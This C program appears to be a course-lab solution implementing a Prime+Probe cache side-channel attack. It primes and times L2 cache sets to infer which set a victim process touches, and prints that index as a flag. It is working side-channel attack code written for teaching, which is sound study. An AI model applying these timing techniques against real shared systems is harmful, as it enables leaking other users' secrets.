#include "common.h"
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#define BUFF_SIZE (1 << 21)
#define NSESTS 1024
#define NWAYS 8 // L1 ways
#define ROUNDS 200
#define THRESHOLD 30 // between L2(22) and L3(38)
#define WAITCYCLES 2000

// waits n cycles
static void wait(int n)
{
    while (n--)
        asm volatile("" ::: "memory");
}

int main()
{
    void *buf =
        mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE,
             MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0);
    if (buf == (void *)-1)
    {
        perror("mmap() error\n");
        exit(EXIT_FAILURE);
    }
    memset(buf, 0x1, BUFF_SIZE);

    // Warmup
    for (int i = 0; i < 1000000; i++)
        measure_one_block_access_time((uint64_t)buf);

    int flag = -1;

    // Implement your attack here
    // Target L2

    // fisher yates shuffle
    srand(time(NULL) ^ getpid()); // set seed
    int order[NWAYS];
    for (int k = 0; k < NWAYS; k++)
        order[k] = k;
    for (int k = NWAYS - 1; k > 0; k--)
    {
        int j = rand() % (k + 1);
        int t = order[k];
        order[k] = order[j];
        order[j] = t;
    }

    // count slow probes per L2 set over many rounds; only the victim's set
    // (= flag) has lines pushed out of L1 to L3, so it collects the most.
    long score[NSESTS] = {0}; // 1024

    for (int r = 0; r < ROUNDS; r++)
    {
        for (int s = 0; s < NSESTS; s++)
        {
            // add set (s << 6)
            ADDR_PTR base = (ADDR_PTR)buf + ((ADDR_PTR)s << 6);

            // prime: for each set, have NWAYS different tag bits
            // add tag (k << 16)
            for (int k = 0; k < NWAYS; k++)
                *(volatile char *)(base + ((ADDR_PTR)order[k] << 16));

            wait(WAITCYCLES);

            // probe: attacker lines evicted to L3
            // add tag (k << 16)
            for (int k = 0; k < NWAYS; k++)
            {
                CYCLES t = measure_one_block_access_time(
                    base + ((ADDR_PTR)order[k] << 16));
                if (t > THRESHOLD)
                    score[s]++; // should add 4 times if slow
            }
        }
    }

    // get max of score
    long best = -1;
    for (int s = 0; s < NSESTS; s++)
        if (score[s] > best)
        {
            best = score[s];
            flag = s;
        }

    printf("Flag: %d\n", flag);
    return 0;
}
